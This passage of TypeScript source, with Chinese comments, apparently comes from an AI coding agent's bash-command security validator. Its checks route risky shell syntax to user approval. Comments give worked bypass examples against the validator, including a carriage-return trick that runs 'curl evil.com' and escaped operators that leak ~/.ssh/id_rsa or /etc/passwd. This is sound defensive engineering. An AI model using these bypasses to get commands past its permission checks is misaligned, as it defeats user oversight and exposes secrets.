    /[<>|]\s*\$[A-Za-z_]/.test(fullyUnquotedContent) ||
    /\$[A-Za-z_][A-Za-z0-9_]*\s*[|<>]/.test(fullyUnquotedContent)
  ) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_VARIABLES,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains variables in dangerous contexts (redirections or pipes)',
    }
  }

  return { behavior: 'passthrough', message: 'No dangerous variables' }
}

function validateDangerousPatterns(
  context: ValidationContext,
): PermissionResult {
  const { unquotedContent } = context

  // 对反引号的特殊处理 —— 只检查未转义的反引号
  // 转义的反引号（例如 \`）是安全的，常用于 SQL 命令
  if (hasUnescapedChar(unquotedContent, '`')) {
    return {
      behavior: 'ask',
      message: 'Command contains backticks (`) for command substitution',
    }
  }

  // 其他命令替换检查（包含双引号内容）
  for (const { pattern, message } of COMMAND_SUBSTITUTION_PATTERNS) {
    if (pattern.test(unquotedContent)) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId:
          BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION,
        subId: 1,
      })
      return { behavior: 'ask', message: `Command contains ${message}` }
    }
  }

  return { behavior: 'passthrough', message: 'No dangerous patterns' }
}

function validateRedirections(context: ValidationContext): PermissionResult {
  const { fullyUnquotedContent } = context

  if (/</.test(fullyUnquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_INPUT_REDIRECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains input redirection (<) which could read sensitive files',
    }
  }

  if (/>/.test(fullyUnquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.DANGEROUS_PATTERNS_OUTPUT_REDIRECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains output redirection (>) which could write to arbitrary files',
    }
  }

  return { behavior: 'passthrough', message: 'No redirections' }
}

function validateNewlines(context: ValidationContext): PermissionResult {
  // 使用 fullyUnquotedPreStrip（stripSafeRedirections 之前）以防止绕过
  // 即剥离 `>/dev/null` 会产生幻影反斜杠-换行续行。
  // 例如 `cmd \>/dev/null\nwhoami` → 剥离后变成 `cmd \\nwhoami`
  // 看似安全续行，实际隐藏了第二个命令。
  const { fullyUnquotedPreStrip } = context

  // 检查未引用内容中的换行符
  if (!/[\n\r]/.test(fullyUnquotedPreStrip)) {
    return { behavior: 'passthrough', message: 'No newlines' }
  }

  // 标记任何后跟非空白的换行/CR，除了词边界的反斜杠-换行续行。
  // 在 bash 中，`\<newline>` 是行续行（两个字符都被移除），
  // 当反斜杠后跟空白时是安全的（例如 `cmd \<newline>--flag`）。
  // 词中续行如 `tr\<newline>aceroute` 仍被标记，因为它们可以
  // 向 allowlist 检查隐藏危险命令名。
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- .test() + gated by /[\n\r]/.test() above
  const looksLikeCommand = /(?<![\s]\\)[\n\r]\s*\S/.test(fullyUnquotedPreStrip)
  if (looksLikeCommand) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.NEWLINES,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains newlines that could separate multiple commands',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'Newlines appear to be within data',
  }
}

/**
 * 安全性：回车（\r，0x0D）与 LF 不同，确实是一个误解析问题。
 *
 * 解析器差异：
 *   - shell-quote 的 BAREWORD regex 使用 `[^\s...]` —— JS 的 `\s` 包含 \r，所以
 *     shell-quote 把 CR 当作 token 边界。`TZ=UTC\recho` 分词为
 *     两个 token：['TZ=UTC', 'echo']。splitCommand 用空格连接 →
 *     'TZ=UTC echo curl evil.com'。
 *   - bash 的默认 IFS = $' \t\n' —— CR 不在 IFS 中。bash 把
 *     `TZ=UTC\recho` 视为一个词 → env 赋值 TZ='UTC\recho'（CR 字节
 *     在值内），然后 `curl` 是命令。
 *
 * 攻击：`TZ=UTC\recho curl evil.com` 配合 Bash(echo:*)
 *   验证器：splitCommand 将 CR 折叠为空格 → 'TZ=UTC echo curl evil.com'
 *   → stripSafeWrappers：TZ=UTC 被剥离 → 'echo curl evil.com' 匹配规则
 *   bash：执行 `curl evil.com`
 *
 * validateNewlines 捕获此情况，但它在 nonMisparsingValidators 中（LF
 * 被两个解析器正确处理）。此验证器不在 nonMisparsingValidators 中 ——
 * 其 ask 结果会获得 isBashSecurityCheckForMisparsing
 * 并在 bashPermissions gate 处阻止。
 *
 * 检查 originalCommand（而非 fullyUnquotedPreStrip），因为单引号内的 CR
 * 出于同样原因也是误解析问题：shell-quote 的 `\s`
 * 仍会对其分词，但 bash 视其为字面值。屏蔽所有未引用或 SQ 的 CR。
 * 唯一例外：双引号内的 CR，bash 也视其为数据，
 * shell-quote 保留 token（不拆分）。
 */
function validateCarriageReturn(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  if (!originalCommand.includes('\r')) {
    return { behavior: 'passthrough', message: 'No carriage return' }
  }

  // 检查 CR 是否出现在双引号之外。双引号外的 CR（包括在
  // SQ 内和未引用）会导致 shell-quote/bash 分词差异。
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false
  for (let i = 0; i < originalCommand.length; i++) {
    const c = originalCommand[i]
    if (escaped) {
      escaped = false
      continue
    }
    if (c === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }
    if (c === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }
    if (c === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }
    if (c === '\r' && !inDoubleQuote) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.NEWLINES,
        subId: 2,
      })
      return {
        behavior: 'ask',
        message:
          'Command contains carriage return (\\r) which shell-quote and bash tokenize differently',
      }
    }
  }

  return { behavior: 'passthrough', message: 'CR only inside double quotes' }
}

function validateIFSInjection(context: ValidationContext): PermissionResult {
  const { originalCommand } = context

  // 检测任何 IFS 变量的使用，可能用于绕过 regex 校验
  // 检查 $IFS 和 ${...IFS...} 模式（包括参数展开如 ${IFS:0:1}、${#IFS} 等）
  // 使用 ${[^}]*IFS 捕获所有带 IFS 的参数展开变体
  if (/\$IFS|\$\{[^}]*IFS/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.IFS_INJECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains IFS variable usage which could bypass security validation',
    }
  }

  return { behavior: 'passthrough', message: 'No IFS injection detected' }
}

// 额外加固，防止通过 /proc 文件系统读取环境变量。
// 路径校验通常会屏蔽 /proc 访问，但这提供纵深防御。
// /proc 中的环境文件可能暴露敏感数据，如 API 密钥和机密。
function validateProcEnvironAccess(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context

  // 检查可能暴露环境变量的 /proc 路径
  // 这会捕获如下模式：
  // - /proc/self/environ
  // - /proc/1/environ
  // - /proc/*/environ（任意 PID）
  if (/\/proc\/.*\/environ/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.PROC_ENVIRON_ACCESS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command accesses /proc/*/environ which could expose sensitive environment variables',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No /proc/environ access detected',
  }
}

/**
 * 检测带畸形 token（未平衡的分隔符）并与命令分隔符组合的命令。
 * 这可捕获歧义 shell 语法可能被利用的潜在注入模式。
 *
 * 安全性：此检查捕获 HackerOne 审查中发现的 eval 绕过。
 * 当 shell-quote 解析歧义模式如 `echo {"hi":"hi;evil"}` 时，
 * 可能产生未平衡的 token（例如 `{hi:"hi`）。与命令分隔符组合后，
 * 可通过 eval 重新解析导致非预期命令执行。
 *
 * 通过强制用户批准这些模式，我们确保用户在批准前确切看到
 * 将要执行的内容。
 */
function validateMalformedTokenInjection(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context

  const parseResult = tryParseShellCommand(originalCommand)
  if (!parseResult.success) {
    // 解析失败 —— 在其他地方处理（bashToolHasPermission 检查此情况）
    return {
      behavior: 'passthrough',
      message: 'Parse failed, handled elsewhere',
    }
  }

  const parsed = parseResult.tokens

  // 检查命令分隔符（;、&&、||）
  const hasCommandSeparator = parsed.some(
    entry =>
      typeof entry === 'object' &&
      entry !== null &&
      'op' in entry &&
      (entry.op === ';' || entry.op === '&&' || entry.op === '||'),
  )

  if (!hasCommandSeparator) {
    return { behavior: 'passthrough', message: 'No command separators' }
  }

  // 检查畸形 token（未平衡的分隔符）
  if (hasMalformedTokens(originalCommand, parsed)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.MALFORMED_TOKEN_INJECTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains ambiguous syntax with command separators that could be misinterpreted',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No malformed token injection detected',
  }
}

function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
  // 屏蔽用于绕过我们 regex 中负向先行断言以屏蔽已知危险 flag 的 shell 引用绕过模式

  const { originalCommand, baseCommand } = context

  // echo 对混淆 flag 是安全的，但仅限简单 echo 命令。
  // 对于复合命令（带 |、&、;），我们需要检查整个命令，
  // 因为危险的 ANSI-C 引用可能在操作符之后。
  const hasShellOperators = /[|&;]/.test(originalCommand)
  if (baseCommand === 'echo' && !hasShellOperators) {
    return {
      behavior: 'passthrough',
      message: 'echo command is safe and has no dangerous flags',
    }
  }

  // 全面混淆检测
  // 这些检查捕获使用 shell 引用隐藏 flag 的各种方式

  // 1. 屏蔽 ANSI-C 引用（$'...'）—— 可通过转义序列编码任意字符
  // 简单模式，匹配任何位置的 $'...'。正确处理：
  // - grep '$' file => 不匹配（$ 是引号内的 regex 锚点，无 $'...' 结构）
  // - 'test'$'-exec' => 匹配（引号与 ANSI-C 拼接）
  // - 零宽空格和其他不可见字符 => 匹配
  // 模式要求 $' 后跟内容（可为空）再后跟闭合 '
  if (/\$'[^']*'/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 5,
    })
    return {
      behavior: 'ask',
      message: 'Command contains ANSI-C quoting which can hide characters',
    }
  }

  // 2. 屏蔽 locale 引用（$"..."） —— 也可使用转义序列
  // 与上面 ANSI-C 引用相同的简单模式
  if (/\$"[^"]*"/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 6,
    })
    return {
      behavior: 'ask',
      message: 'Command contains locale quoting which can hide characters',
    }
  }

  // 3. 屏蔽空的 ANSI-C 或 locale 引用后跟 dash
  // $''-exec 或 $""-exec
  if (/\$['"]{2}\s*-/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 9,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains empty special quotes before dash (potential bypass)',
    }
  }

  // 4. 屏蔽任何后跟 dash 的空引号序列
  // 这会捕获：''-  ""-  ''""-  ""''-  ''""''-  等
  // 模式查找一个或多个空引号对后跟可选空白和 dash
  if (/(?:^|\s)(?:''|"")+\s*-/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 7,
    })
    return {
      behavior: 'ask',
      message: 'Command contains empty quotes before dash (potential bypass)',
    }
  }

  // 4b. 安全性：屏蔽紧邻引号 dash 的同质空引号对。模式如 `"""-f"`
  // （空 `""` + 引号 `"-f"`）在 bash 中拼接为 `-f`，但能绕过上述所有检查：
  //   - 上面 regex (4)：`(?:''|"")+\s*-` 匹配 `""` 对，然后期望
  //     可选空格和 dash —— 但找到第三个 `"`。不匹配。
  //   - 引号内容扫描器（下方）：看到第一个 `""` 对，内容为空
  //     （不以 dash 开头）。第三个 `"` 开启新的引号区域，
  //     由主引号状态跟踪器处理。
  //   - 引号状态跟踪器：`""` 切换 inDoubleQuote 开/关；第三个 `"`
  //     再次开启。`"-f"` 内的 `-` 在引号内 → 被跳过。
  //   - Flag 扫描器：查找 `-` 前的 `\s`。`-` 前是 `"`。
  //   - fullyUnquotedContent：`""` 和 `"-f"` 都被剥离。
  //
  // 在 bash 中，`"""-f"` = 空字符串 + 字符串 "-f" = `-f`。此绕过对
  // 任何危险 flag 检查（jq -f、find -exec、fc -e）都有效，
  // 只要有匹配的 prefix 权限（Bash(jq:*)、Bash(find:*)）。
  //
  // regex `(?:""|'')+['"]-` 匹配：
  //   - 一个或多个同质空对（`""` 或 `''`）—— bash 将空字符串
  //     拼接到 flag 的拼接点。
  //   - 紧跟任意引号字符 —— 开启 flag 引号区域。
  //   - 紧跟 `-` —— 混淆的 flag。
  //
  // 位置无关：我们不要求词首（`(?:^|\s)`），因为
  // prefix 如 `$x"""-f"`（未设置/空变量）以同样方式拼接。
  // 同质空对要求过滤掉 `'"'"'` 惯用法
  // （无同质空对 —— 它是 close、双引号内容、open）。
  //
  // 假阳性：匹配 `echo '"""-f" text'`（单引号字符串内的模式）。
  // 极罕见（需要 echo 字面攻击）。可接受。
  if (/(?:""|'')+['"]-/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 10,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains empty quote pair adjacent to quoted dash (potential flag obfuscation)',
    }
  }

  // 4c. 安全性：也屏蔽词首 3 个或更多连续引号，即使没有
  // 紧跟 dash。为上面未枚举的多引号混淆模式提供更广的安全网
  // （例如 `"""x"-f`，引号间内容移动了 dash 位置）。
  // 合法命令从不需要 `"""x"`（当 `"x"` 就能用时）。
  if (/(?:^|\s)['"]{3,}/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 11,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains consecutive quote characters at word start (potential obfuscation)',
    }
  }

  // 跟踪引号状态以避免引号字符串内 flag 的假阳性
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < originalCommand.length - 1; i++) {
    const currentChar = originalCommand[i]
    const nextChar = originalCommand[i + 1]

    // 更新引号状态
    if (escaped) {
      escaped = false
      continue
    }

    // 安全性：只在单引号外把反斜杠视为转义。在 bash 中，
    // `'...'` 内的 `\` 是字面值。没有此保护，`'\'` 会使引号
    // 跟踪器失步：`\` 设置 escaped=true，闭合 `'` 被上面的
    // escaped-skip 消费，而不是切换 inSingleQuote。解析器保持在
    // 单引号模式，并且第 ~1121 行的 `if (inSingleQuote || inDoubleQuote) continue`
    // 跳过命令剩余部分的所有后续 flag 检测。
    // 示例：`jq '\' "-f" evil` —— bash 得到 `-f` 参数，但失步的
    // 解析器认为 ` "-f" evil` 在引号内 → flag 检测被绕过。
    // 纵深防御：hasShellQuoteSingleQuoteBug 在第 ~1856 行
    // 此处运行前捕获 `'\'` 模式。但我们修复跟踪器以与
    // 本文件其他地方的 CORRECT 实现（hasBackslashEscaped*、
    // extractQuotedContent）保持一致，它们都用 `!inSingleQuote` 保护。
    if (currentChar === '\\' && !inSingleQuote) {
      escaped = true
      continue
    }

    if (currentChar === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }

    if (currentChar === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }

    // 只在不在引号字符串内时查找 flags
    // 这防止假阳性，如：make test TEST="file.py -v"
    if (inSingleQuote || inDoubleQuote) {
      continue
    }

    // 查找后跟含 dash 的引号的空白（潜在 flag 混淆）
    // 安全性：屏蔽任何以 dash 开头的引号内容 —— 宁可保守
    // 捕获："-"exec、"-file"、"--flag"、'-'output 等
    // 如果合法，用户可手动批准（例如 find . -name "-file"）
    if (
      currentChar &&
      nextChar &&
      /\s/.test(currentChar) &&
      /['"`]/.test(nextChar)
    ) {
      const quoteChar = nextChar
      let j = i + 2 // 从开引号之后开始
      let insideQuote = ''

      // 收集引号内的内容
      while (j < originalCommand.length && originalCommand[j] !== quoteChar) {
        insideQuote += originalCommand[j]!
        j++
      }

      // 如果找到闭合引号且内容看起来像混淆 flag，则屏蔽。
      // 要捕获的三种攻击模式：
      //   1. 引号内的 flag 名："--flag"、"-exec"、"-X"（引号内有 dash + 字母）
      //   2. 分裂引号 flag："-"exec、"--"output（引号内有 dash，字母在引号后继续）
      //   3. 链式引号："-""exec"（第一个引号有 dash，第二个引号含字母）
      // 纯 dash 字符串如 "---" 或 "--" 后跟空白/分隔符是分隔符，
      // 不是 flag，不应触发此检查。
      const charAfterQuote = originalCommand[j + 1]
      // 双引号内，$VAR 和 `cmd` 在运行时展开，所以 "-$VAR" 可
      // 变为 -exec。在此屏蔽 $ 和 ` 会过度屏蔽单引号字面值
      // 如 grep '-$'（其中 $ 是字面值），但 main 的 startsWith('-') 已
      // 屏蔽了那些 —— 这恢复了原状，不是新的假阳性。
      // 花括号展开（{）在引号内不会发生，所以这里不需要 {。
      const hasFlagCharsInside = /^-+[a-zA-Z0-9$`]/.test(insideQuote)
      // 闭合引号后可继续 flag 的字符。这会捕获：
      //   a-zA-Z0-9："-"exec → -exec（直接拼接）
      //   \\:        "-"\exec → -exec（反斜杠转义被剥离）
      //   -:         "-"-output → --output（额外 dash）
      //   {:         "-"{exec,delete} → -exec -delete（花括号展开）
      //   $:         "-"$VAR → -exec 当 VAR=exec（变量展开）
      //   `:         "-"`echo exec` → -exec（命令替换）
      // 注意：glob 字符（*?[）被省略 —— 它们需要攻击者控制的
      // CWD 文件名才能利用，屏蔽它们会破坏模式
      // 如 `ls -- "-"*` 用于列出以 dash 开头的文件。
      const FLAG_CONTINUATION_CHARS = /[a-zA-Z0-9\\${`-]/
      const hasFlagCharsContinuing =
        /^-+$/.test(insideQuote) &&
        charAfterQuote !== undefined &&
        FLAG_CONTINUATION_CHARS.test(charAfterQuote)
      // 处理相邻引号链："-""exec" 或 "-""-"exec 或 """-"exec 在 shell 中
      // 拼接为 -exec。沿着相邻引号段链直到
      // 找到含字母数字字符的段或命中非引号边界。
      // 也处理空前缀引号："""-"exec 其中 "" 后跟 "-"exec
      // 组合段如果含 dash 后跟字母数字则形成 flag。
      const hasFlagCharsInNextQuote =
        // 触发条件：第一段只有 dash 或为空（可能是 flag 的 prefix）
        (insideQuote === '' || /^-+$/.test(insideQuote)) &&
        charAfterQuote !== undefined &&
        /['"`]/.test(charAfterQuote) &&
        (() => {
          let pos = j + 1 // 从 charAfterQuote 开始（一个开引号）
          let combinedContent = insideQuote // 跟踪 shell 将看到的内容
          while (
            pos < originalCommand.length &&
            /['"`]/.test(originalCommand[pos]!)
          ) {
            const segQuote = originalCommand[pos]!
            let end = pos + 1
            while (
              end < originalCommand.length &&
              originalCommand[end] !== segQuote
            ) {
              end++
            }
            const segment = originalCommand.slice(pos + 1, end)
            combinedContent += segment

            // 检查到目前为止的组合内容是否形成 flag 模式。
            // 包含 $ 和 ` 用于引号内展开："-""$VAR" → -exec
            if (/^-+[a-zA-Z0-9$`]/.test(combinedContent)) return true

            // 如果此段有字母数字/展开且我们已有 dash，
            // 则是 flag。捕获 "-""$*" 其中 segment='$*' 无字母数字但
            // 运行时展开为位置参数。
            // 防护 segment.length === 0：slice(0, -0) → slice(0, 0) → ''。
            const priorContent =
              segment.length > 0
                ? combinedContent.slice(0, -segment.length)
                : combinedContent
            if (/^-+$/.test(priorContent)) {
              if (/[a-zA-Z0-9$`]/.test(segment)) return true
            }

            if (end >= originalCommand.length) break // 未闭合的引号
            pos = end + 1 // 跳过闭合引号以检查下一段
          }
          // 也检查链末尾的未引用字符
          if (
            pos < originalCommand.length &&
            FLAG_CONTINUATION_CHARS.test(originalCommand[pos]!)
          ) {
            // 如果组合内容中有 dash，尾随字符完成一个 flag
            if (/^-+$/.test(combinedContent) || combinedContent === '') {
              // 检查是否将用后续内容形成 flag
              const nextChar = originalCommand[pos]!
              if (nextChar === '-') {
                // 更多 dash，仍可能形成 flag
                return true
              }
              if (/[a-zA-Z0-9\\${`]/.test(nextChar) && combinedContent !== '') {
                // 我们有 dash 且现在跟字母数字/展开
                return true
              }
            }
            // 原始检查：dash 后跟字母数字
            if (/^-/.test(combinedContent)) {
              return true
            }
          }
          return false
        })()
      if (
        j < originalCommand.length &&
        originalCommand[j] === quoteChar &&
        (hasFlagCharsInside ||
          hasFlagCharsContinuing ||
          hasFlagCharsInNextQuote)
      ) {
        logEvent('tengu_bash_security_check_triggered', {
          checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
          subId: 4,
        })
        return {
          behavior: 'ask',
          message: 'Command contains quoted characters in flag names',
        }
      }
    }

    // 查找后跟 dash 的空白 —— 这开始一个 flag
    if (currentChar && nextChar && /\s/.test(currentChar) && nextChar === '-') {
      let j = i + 1 // 从 dash 开始
      let flagContent = ''

      // 收集 flag 内容
      while (j < originalCommand.length) {
        const flagChar = originalCommand[j]
        if (!flagChar) break

        // 一旦遇到空白或等号就结束 flag 内容
        if (/[\s=]/.test(flagChar)) {
          break
        }
        // 如果遇到引号后跟非 flag 字符，结束 flag 收集。这是为了处理
        // 如 -d"," 这类情况，应被解析为只是 -d
        if (/['"`]/.test(flagChar)) {
          // cut -d flag 的特殊情况：分隔符值可以带引号
          // 例如：cut -d'"' 应解析为 flag 名：-d，值：'"'
          // 注意：我们只对 cut -d 应用此例外以避免绕过。
          // 没有此限制，类似 `find -e"xec"` 的命令可能被解析为
          // flag 名：-e，绕过我们对 -exec 的黑名单。限制为 cut -d，
          // 我们允许合法用例同时防止其他命令中
          // 带引号的 flag 值隐藏危险 flag 名的混淆攻击。
          if (
            baseCommand === 'cut' &&
            flagContent === '-d' &&
            /['"`]/.test(flagChar)
          ) {
            // 这是 cut -d 后跟带引号的分隔符 —— flagContent 已经是 '-d'
            break
          }

          // 向前查看引号后跟随的内容
          if (j + 1 < originalCommand.length) {
            const nextFlagChar = originalCommand[j + 1]
            if (nextFlagChar && !/[a-zA-Z0-9_'"-]/.test(nextFlagChar)) {
              // 引号后跟明显不是 flag 一部分的内容，结束解析
              break
            }
          }
        }
        flagContent += flagChar
        j++
      }

      if (flagContent.includes('"') || flagContent.includes("'")) {
        logEvent('tengu_bash_security_check_triggered', {
          checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
          subId: 1,
        })
        return {
          behavior: 'ask',
          message: 'Command contains quoted characters in flag names',
        }
      }
    }
  }

  // 也处理以引号开头的 flag："--"output、'-'-output 等
  // 使用 fullyUnquotedContent 以避免对合法引号内容如 echo "---" 的假阳性
  if (/\s['"`]-/.test(context.fullyUnquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 2,
    })
    return {
      behavior: 'ask',
      message: 'Command contains quoted characters in flag names',
    }
  }

  // 也处理类似 ""--output 的情况
  // 使用 fullyUnquotedContent 以避免对合法引号内容的假阳性
  if (/['"`]{2}-/.test(context.fullyUnquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
      subId: 3,
    })
    return {
      behavior: 'ask',
      message: 'Command contains quoted characters in flag names',
    }
  }

  return { behavior: 'passthrough', message: 'No obfuscated flags detected' }
}

/**
 * 检测引号外的反斜杠转义空白字符（空格、制表符）。
 *
 * 在 bash 中，`echo\ test` 是单个 token（名为 "echo test" 的命令），但
 * shell-quote 解码该转义并生成 `echo test`（两个独立的 token）。
 * 这种差异允许路径遍历攻击，如：
 *   echo\ test/../../../usr/bin/touch /tmp/file
 * 解析器看到的是 `echo test/.../touch /tmp/file`（一个 echo 命令）
 * 但 bash 解析为 `/usr/bin/touch /tmp/file`（通过目录 "echo test"）。
 */
function hasBackslashEscapedWhitespace(command: string): boolean {
  let inSingleQuote = false
  let inDoubleQuote = false

  for (let i = 0; i < command.length; i++) {
    const char = command[i]

    if (char === '\\' && !inSingleQuote) {
      if (!inDoubleQuote) {
        const nextChar = command[i + 1]
        if (nextChar === ' ' || nextChar === '\t') {
          return true
        }
      }
      // 跳过被转义的字符（引号外和双引号内都跳过，
      // 双引号内 \\、\"、\$、\` 是有效的转义序列）
      i++
      continue
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      continue
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
    }
  }

  return false
}

function validateBackslashEscapedWhitespace(
  context: ValidationContext,
): PermissionResult {
  if (hasBackslashEscapedWhitespace(context.originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.BACKSLASH_ESCAPED_WHITESPACE,
    })
    return {
      behavior: 'ask',
      message:
        'Command contains backslash-escaped whitespace that could alter command parsing',
    }
  }

  return {
    behavior: 'passthrough',
    message: 'No backslash-escaped whitespace',
  }
}

/**
 * 检测引号外紧接 shell 操作符前的反斜杠。
 *
 * 安全性：splitCommand 在其输出字符串中将 `\;` 规范化为裸 `;`。
 * 当下游代码（checkReadOnlyConstraints、checkPathConstraints 等）
 * 重新解析该规范化字符串时，裸 `;` 被视为操作符并
 * 导致错误的分割。这允许绕过路径检查进行任意文件读取：
 *
 *   cat safe.txt \; echo ~/.ssh/id_rsa
 *
 * 在 bash 中：一个 cat 命令读取 safe.txt、;、echo、~/.ssh/id_rsa 作为文件。
 * splitCommand 规范化后："cat safe.txt ; echo ~/.ssh/id_rsa"
 * 嵌套重新解析：["cat safe.txt", "echo ~/.ssh/id_rsa"] —— 两段都
 * 通过 isCommandReadOnly，隐藏在 echo 段中的敏感路径从未被
 * 路径约束校验。自动允许。私钥泄露。
 *
 * 此检查标记任何 \<operator>，无论反斜杠奇偶。偶数个
 *（\\;）在 bash 中是危险的（\\ → \，; 分隔）。奇数个（\;）在 bash 中安全，
 * 但会触发上述双重解析 bug。两者都必须被标记。
 *
 * 已知假阳性：`find . -exec cmd {} \;` —— 用户将被提示一次。
 *
 * 注意：`(` 和 `)` 不在此集合中 —— splitCommand 在其
 * 输出中保留 `\(` 和 `\)`（往返安全），所以它们不会触发双重解析 bug。
 * 这允许 `find . \( -name x -o -name y \)` 无假阳性通过。
 */
const SHELL_OPERATORS = new Set([';', '|', '&', '<', '>'])

function hasBackslashEscapedOperator(command: string): boolean {
  let inSingleQuote = false
  let inDoubleQuote = false

  for (let i = 0; i < command.length; i++) {
    const char = command[i]

    // 安全性：先处理反斜杠，再处理引号切换。在 bash 中，双引号内的
    // `\"` 是产生字面 `"` 的转义序列 —— 它
    // 不闭合引号。如果我们先处理引号切换，`"..."` 内的 `\"`
    // 会使跟踪器失步：
    //   - `\` 被忽略（由 !inDoubleQuote 控制）
    //   - `"` 将 inDoubleQuote 切换为 FALSE（错误 —— bash 认为仍在内）
    //   - 下一个 `"`（真正的闭合引号）切换回 TRUE —— 锁定失步
    //   - 后续 `\;` 被遗漏，因为 !inDoubleQuote 为 false
    // 攻击：`tac "x\"y" \; echo ~/.ssh/id_rsa` —— bash 运行一个 tac 把
    // 所有参数作为文件读取（泄露 id_rsa），但失步的跟踪器遗漏 `\;`，
    // splitCommand 的双重解析规范化“看到”两个安全命令。
    //
    // 修复结构匹配 hasBackslashEscapedWhitespace（在 d000dfe84e 之前的
    // commit 中已正确修复此问题）：先检查反斜杠，
    // 只由 !inSingleQuote 控制（因为反斜杠在 '...' 内是字面值），
    // 无条件 i++ 跳过被转义字符（即使在双引号内）。
    if (char === '\\' && !inSingleQuote) {
      // 只在双引号外标记 \<operator>（双引号内，
      // 操作符如 ;|&<> 已不特殊，所以 \; 在那里无害）。
      if (!inDoubleQuote) {
        const nextChar = command[i + 1]
        if (nextChar && SHELL_OPERATORS.has(nextChar)) {
          return true
        }
      }
      // 无条件跳过被转义字符。双引号内，这会
      // 正确消费反斜杠对：`"x\\"` → 位置 6（`\`）跳过位置 7
      // （`\`），然后位置 8（`"`）正确关闭 inDoubleQuote。没有
      // 无条件跳过，位置 7 会看到 `\`，把位置 8（`"`）视为 nextChar，
      // 跳过它，闭合引号永远不会切换 inDoubleQuote ——
      // 永久失步并遗漏后续引号外的 `\;`。
      // 攻击：`cat "x\\" \; echo /etc/passwd` —— bash 读取 /etc/passwd。
      //
      // 这正确处理反斜杠奇偶：奇数个 `\;`（1、3、5...）
      // 被标记（检测到 `;` 前未配对的 `\`）。偶数个 `\\;`
      // （2、4...）不被标记，这是 CORRECT 的 —— bash 把 `\\` 视为
      // 字面 `\`，`;` 视为分隔符，所以 splitCommand 正常处理它
      // （无双重解析 bug）。这匹配
      // hasBackslashEscapedWhitespace 第 ~1340 行。
      i++
      continue
    }

    // 引号切换在反斜杠处理之后（反斜杠已跳过
    // 任何被转义的引号字符，所以这些切换只对未转义引号触发）。
    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      continue
    }
    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
    }
  }

  return false
}

function validateBackslashEscapedOperators(
  context: ValidationContext,
): PermissionResult {
  // Tree-sitter 路径：如果 tree-sitter 确认 AST 中没有实际操作符节点，
  // 则任何 \; 只是 word 参数中的转义字符
